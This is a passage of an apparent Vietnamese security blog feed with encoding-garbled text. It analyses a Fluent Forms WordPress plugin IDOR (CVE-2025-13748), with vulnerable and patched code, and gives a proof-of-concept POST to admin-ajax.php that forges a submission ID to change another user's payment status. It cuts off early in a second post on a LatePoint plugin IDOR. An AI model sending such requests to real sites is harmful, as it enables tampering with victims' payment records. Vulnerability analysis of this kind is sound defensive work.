ƒë·ªÅu c√≥ th·ªÉ ch·ªâ ƒë·ªãnh b·∫•t k·ª≥ submission n√†o t·ªìn t·∫°i trong database.&lt;/p&gt;&#xA;&lt;p&gt;Sau khi l·∫•y &lt;code&gt;submission_id&lt;/code&gt;, h·ªá th·ªëng ti·∫øp t·ª•c:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;setSubmissionId($submissionId);&#xA;$submission = $this-&amp;gt;getSubmission();&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;·ªû ƒë√¢y x·∫£y ra ƒëi·ªÅu c·ªët l√µi c·ªßa IDOR: Object (submission) ƒë∆∞·ª£c truy xu·∫•t tr·ª±c ti·∫øp b·∫±ng ID do user ki·ªÉm so√°t, m√† kh√¥ng c√≥ b·∫•t k·ª≥ l·ªõp ki·ªÉm so√°t truy c·∫≠p n√†o.&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Kh√¥ng c√≥ b·∫•t k·ª≥ logic n√†o nh∆∞:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ($submission-&amp;gt;user_id !== get_current_user_id()) {&#xA;    deny_access();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hay:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ($submission-&amp;gt;form_id !== $formId) {&#xA;    deny_access();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn vi·ªác: Submission c·ªßa user A c√≥ th·ªÉ b·ªã thao t√°c b·ªüi ng∆∞·ªùi ch∆∞a ƒëƒÉng nh·∫≠p.&lt;/p&gt;&#xA;&lt;p&gt;·ªû b·∫£n v√°, to√†n b·ªô request ph·∫£i v∆∞·ª£t qua b∆∞·ªõc x√°c th·ª±c:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-27-cve-2025-13748/patch.png&#34; title=&#34;B·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-12-27-cve-2025-13748/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;B·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-27-cve-2025-13748/patch.png&#39; alt=&#34;Patch&#34; height=&#34;447&#34; width=&#34;1875&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;B·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function validateScaRequest($submissionId, $paymentIntentId, $submission = null, $transaction = null)&#xA;{&#xA;    $strictMode = apply_filters(&amp;#39;fluentform/stripe_sca_strict_security&amp;#39;, false);&#xA;    $warnings = [];&#xA;&#xA;    // Validate nonce (optional in non-strict mode for backward compatibility)&#xA;    $nonce = isset($_REQUEST[&amp;#39;_ff_stripe_nonce&amp;#39;]) ? sanitize_text_field(wp_unslash($_REQUEST[&amp;#39;_ff_stripe_nonce&amp;#39;])) : &amp;#39;&amp;#39;;&#xA;    &#xA;    if ($nonce) {&#xA;        $nonceAction = &amp;#39;fluentform_sca_confirm_&amp;#39; . $submissionId;&#xA;        if (!wp_verify_nonce($nonce, $nonceAction)) {&#xA;            $error = __(&amp;#39;Security verification failed. Invalid nonce.&amp;#39;, &amp;#39;fluentform&amp;#39;);&#xA;            if ($strictMode) {&#xA;                return new \WP_Error(&amp;#39;invalid_nonce&amp;#39;, $error);&#xA;            }&#xA;            $warnings[] = &amp;#39;Invalid nonce provided&amp;#39;;&#xA;        }&#xA;    } else {&#xA;        $warning = &amp;#39;No nonce provided for SCA payment confirmation&amp;#39;;&#xA;        if ($strictMode) {&#xA;            return new \WP_Error(&amp;#39;missing_nonce&amp;#39;, __(&amp;#39;Security verification failed. Nonce required.&amp;#39;, &amp;#39;fluentform&amp;#39;));&#xA;        }&#xA;        $warnings[] = $warning;&#xA;    }&#xA;&#xA;    // Validate submission exists&#xA;    if (!$submission || !$submission-&amp;gt;id) {&#xA;        return new \WP_Error(&amp;#39;invalid_submission&amp;#39;, __(&amp;#39;Invalid submission.&amp;#39;, &amp;#39;fluentform&amp;#39;));&#xA;    }&#xA;&#xA;&#xA;    if ($submission-&amp;gt;payment_status === &amp;#39;paid&amp;#39;) {&#xA;        return new \WP_Error(&#xA;            &amp;#39;already_paid&amp;#39;,&#xA;            __(&amp;#39;This payment has already been completed and cannot be modified.&amp;#39;, &amp;#39;fluentform&amp;#39;)&#xA;        );&#xA;    }&#xA;&#xA;    // stores it in transaction.charge_id, and frontend sends it back.&#xA;    // Mismatch only occurs during attack attempts.&#xA;    if ($transaction &amp;amp;&amp;amp; $transaction-&amp;gt;charge_id) {&#xA;        if ($transaction-&amp;gt;charge_id !== $paymentIntentId) {&#xA;            return new \WP_Error(&#xA;                &amp;#39;payment_intent_mismatch&amp;#39;,&#xA;                __(&amp;#39;Payment verification failed. Payment intent does not match.&amp;#39;, &amp;#39;fluentform&amp;#39;)&#xA;            );&#xA;        }&#xA;    }&#xA;&#xA;    // Log warnings for monitoring&#xA;    if (!empty($warnings) &amp;amp;&amp;amp; defined(&amp;#39;WP_DEBUG&amp;#39;) &amp;amp;&amp;amp; WP_DEBUG) {&#xA;        $logData = [&#xA;            &amp;#39;parent_source_id&amp;#39; =&amp;gt; $submission-&amp;gt;form_id,&#xA;            &amp;#39;source_type&amp;#39;      =&amp;gt; &amp;#39;submission_item&amp;#39;,&#xA;            &amp;#39;source_id&amp;#39;        =&amp;gt; $submission-&amp;gt;id,&#xA;            &amp;#39;component&amp;#39;        =&amp;gt; &amp;#39;Payment&amp;#39;,&#xA;            &amp;#39;status&amp;#39;           =&amp;gt; &amp;#39;warning&amp;#39;,&#xA;            &amp;#39;title&amp;#39;            =&amp;gt; __(&amp;#39;Stripe SCA Security Warning&amp;#39;, &amp;#39;fluentform&amp;#39;),&#xA;            &amp;#39;description&amp;#39;      =&amp;gt; implode(&amp;#39;; &amp;#39;, $warnings)&#xA;        ];&#xA;        do_action(&amp;#39;fluentform/log_data&amp;#39;, $logData);&#xA;    }&#xA;&#xA;    return [&#xA;        &amp;#39;valid&amp;#39;    =&amp;gt; true,&#xA;        &amp;#39;warnings&amp;#39; =&amp;gt; $warnings&#xA;    ];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;validateScaRequest&lt;/code&gt; th·ª±c hi·ªán:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ki·ªÉm tra &lt;code&gt;submission_id&lt;/code&gt; c√≥ t·ªìn t·∫°i h·ª£p l·ªá hay kh√¥ng&lt;/li&gt;&#xA;&lt;li&gt;NgƒÉn x·ª≠ l√Ω n·∫øu submission ƒë√£ ƒë∆∞·ª£c thanh to√°n&lt;/li&gt;&#xA;&lt;li&gt;R√†ng bu·ªôc &lt;code&gt;payment_intent_id&lt;/code&gt; v·ªõi transaction t∆∞∆°ng ·ª©ng&lt;/li&gt;&#xA;&lt;li&gt;NgƒÉn vi·ªác d√πng payment intent gi·∫£ m·∫°o&lt;/li&gt;&#xA;&lt;li&gt;Th√™m x√°c th·ª±c nonce cho request&lt;/li&gt;&#xA;&lt;li&gt;Ghi log khi ph√°t hi·ªán h√†nh vi b·∫•t th∆∞·ªùng&lt;/li&gt;&#xA;&lt;li&gt;Ch·∫∑n ho√†n to√†n vi·ªác thay ƒë·ªïi tr·∫°ng th√°i submission tr√°i ph√©p&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;ƒêi·ªÅu n√†y ƒë√£ ki·ªÉm so√°t ch·∫∑t logic, khi·∫øn l·ªói h·ªïng IDOR kh√¥ng th·ªÉ x·∫£y ra.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated Attacker&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Send request to admin-ajax.php?action=fluentform_sca_inline_confirm_payment&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Extract submission_id &amp;amp; payment_intent_id from request&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;No nonce validation&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Load submission by submission_id&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;No ownership or relationship check&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Load transaction using submission_id&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;No validation between payment_intent_id and transaction&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;Process payment confirmation&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;Update submission status (success / failed)&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;Attacker manipulates victim&amp;#39;s submission&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;G·ª≠i request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: victim.com&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;action=fluentform_sca_inline_confirm_payment&#xA;&amp;amp;submission_id=1024&#xA;&amp;amp;payment_method=card&#xA;&amp;amp;payment_intent_id=pi_fake&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng CVE-2025-13748 xu·∫•t ph√°t t·ª´ vi·ªác &lt;strong&gt;tin t∆∞·ªüng d·ªØ li·ªáu ƒë·∫ßu v√†o do client ki·ªÉm so√°t&lt;/strong&gt;, c·ª• th·ªÉ l√† &lt;code&gt;submission_id&lt;/code&gt;, trong khi kh√¥ng c√≥ b·∫•t k·ª≥ c∆° ch·∫ø ki·ªÉm so√°t quy·ªÅn s·ªü h·ªØu ho·∫∑c x√°c th·ª±c ng·ªØ c·∫£nh n√†o. Endpoint x√°c nh·∫≠n thanh to√°n ƒë∆∞·ª£c m·ªü cho ng∆∞·ªùi ch∆∞a ƒëƒÉng nh·∫≠p v√† cho ph√©p thao t√°c tr·ª±c ti·∫øp l√™n submission m√† kh√¥ng r√†ng bu·ªôc v·ªõi user, form hay transaction h·ª£p l·ªá.&lt;/p&gt;&#xA;&lt;p&gt;Vi·ªác thi·∫øu ki·ªÉm tra ownership, thi·∫øu r√†ng bu·ªôc gi·ªØa &lt;code&gt;payment_intent_id&lt;/code&gt; v√† transaction, c√πng v·ªõi vi·ªác kh√¥ng x√°c th·ª±c ngu·ªìn request ƒë√£ t·∫°o ƒëi·ªÅu ki·ªán cho k·∫ª t·∫•n c√¥ng &lt;strong&gt;thao t√∫ng tr·∫°ng th√°i thanh to√°n c·ªßa ng∆∞·ªùi kh√°c&lt;/strong&gt;. ƒê√¢y l√† m·ªôt tr∆∞·ªùng h·ª£p ƒëi·ªÉn h√¨nh c·ªßa &lt;strong&gt;Insecure Direct Object Reference (IDOR)&lt;/strong&gt; ph√°t sinh t·ª´ l·ªói thi·∫øt k·∫ø logic nghi·ªáp v·ª•, kh√¥ng ph·∫£i l·ªói k·ªπ thu·∫≠t ƒë∆°n l·∫ª.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° ƒë√£ kh·∫Øc ph·ª•c tri·ªát ƒë·ªÉ b·∫±ng c√°ch b·ªï sung nhi·ªÅu l·ªõp ki·ªÉm so√°t, x√°c th·ª±c v√† r√†ng bu·ªôc d·ªØ li·ªáu, t·ª´ ƒë√≥ lo·∫°i b·ªè ho√†n to√†n kh·∫£ nƒÉng khai th√°c.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng bao gi·ªù tin d·ªØ li·ªáu do client cung c·∫•p, k·ªÉ c·∫£ trong c√°c lu·ªìng n·ªôi b·ªô nh∆∞ thanh to√°n.&lt;/li&gt;&#xA;&lt;li&gt;IDOR th∆∞·ªùng ph√°t sinh t·ª´ &lt;strong&gt;thi·∫øu ki·ªÉm so√°t ownership&lt;/strong&gt;, kh√¥ng ph·∫£i do thi·∫øu x√°c th·ª±c ƒë·∫ßu v√†o.&lt;/li&gt;&#xA;&lt;li&gt;C√°c endpoint &lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; c·∫ßn ƒë∆∞·ª£c ki·ªÉm so√°t ch·∫∑t ch·∫Ω v√¨ ch√∫ng m·ªü cho m·ªçi ƒë·ªëi t∆∞·ª£ng truy c·∫≠p.&lt;/li&gt;&#xA;&lt;li&gt;Payment flow ph·∫£i r√†ng bu·ªôc ch·∫∑t ch·∫Ω gi·ªØa &lt;strong&gt;submission ‚Äì transaction ‚Äì payment intent&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;C·∫ßn x√°c th·ª±c c·∫£ &lt;strong&gt;ngu·ªìn request&lt;/strong&gt; l·∫´n &lt;strong&gt;ng·ªØ c·∫£nh nghi·ªáp v·ª•&lt;/strong&gt;, kh√¥ng ch·ªâ d·ªØ li·ªáu.&lt;/li&gt;&#xA;&lt;li&gt;Defense-in-depth (nhi·ªÅu l·ªõp ki·ªÉm so√°t) l√† c√°ch duy nh·∫•t ƒë·ªÉ ngƒÉn IDOR hi·ªáu qu·∫£.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/fluentform/vulnerability/wordpress-fluent-forms-plugin-6-1-7-unauthenticated-insecure-direct-object-reference-to-payment-status-tampering-via-submission-id-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress FluentForm Plugin &amp;lt;= 6.1.7 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-3769 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-26-cve-2025-3769/</link>
      <pubDate>Fri, 26 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-26-cve-2025-3769/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;LatePoint ‚Äì Calendar Booking Plugin for Appointments and Events&lt;/strong&gt; tr√™n WordPress c√≥ &lt;strong&gt;l·ªó h·ªïng Insecure Direct Object Reference (IDOR)&lt;/strong&gt; ·ªü t·∫•t c·∫£ c√°c phi√™n b·∫£n l√™n ƒë·∫øn v√† bao g·ªìm &lt;strong&gt;5.1.92&lt;/strong&gt; th√¥ng qua tham s·ªë &lt;code&gt;view_booking_summary_in_lightbox&lt;/code&gt;, do &lt;strong&gt;thi·∫øu ki·ªÉm tra h·ª£p l·ªá tr√™n kh√≥a do ng∆∞·ªùi d√πng ƒëi·ªÅu khi·ªÉn&lt;/strong&gt;.&lt;br&gt;&#xA;L·ªó h·ªïng n√†y cho ph√©p &lt;strong&gt;k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c&lt;/strong&gt; c√≥ th·ªÉ truy xu·∫•t chi ti·∫øt c√°c cu·ªôc h·∫πn, bao g·ªìm &lt;strong&gt;t√™n kh√°ch h√†ng v√† ƒë·ªãa ch·ªâ email&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-3769&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-3769&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.1.92&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.1.93&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/latepoint/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LatePoint Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;LatePoint&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;5.1.92&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;5.1.93&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 